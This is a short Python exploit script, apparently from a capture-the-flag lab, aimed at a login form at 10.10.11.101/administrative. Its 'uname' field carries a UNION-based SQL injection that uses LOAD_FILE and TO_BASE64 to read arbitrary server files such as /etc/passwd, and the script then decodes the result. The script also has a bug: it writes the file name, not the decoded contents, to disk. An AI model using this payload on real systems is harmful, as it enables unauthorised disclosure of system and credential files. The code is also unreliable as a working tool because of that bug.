import requests
import base64
from bs4 import BeautifulSoup
import sys

url = 'http://10.10.11.101/administrative'

response = requests.post(url = url, data = {"uname": "' union select 1,TO_BASE64(LOAD_FILE('{}')),3,4,5,6-- -".format(sys.argv[1]), "password": ""})
# make a post request to /administrative containing the injection payload in the 'uname' parameter. Base64 encode the file contents to avoid HTML entity encoding 

soup = BeautifulSoup(response.text, 'html.parser')
# parse the HTML tags

base64_file = soup.find('h3').text.split(' ')[1]
# 

file = base64.b64decode(base64_file.encode()).decode()
# decode the file contents

file_name = sys.argv[1].replace('/', '_')[1:]        
# create filename, replacing forward slashes with underscores e.g '/etc/passwd' --> 'etc_passwd'

with open(file_name, 'w') as f:
        f.write(file_name)
        f.close()
# write the contents to the file   
    
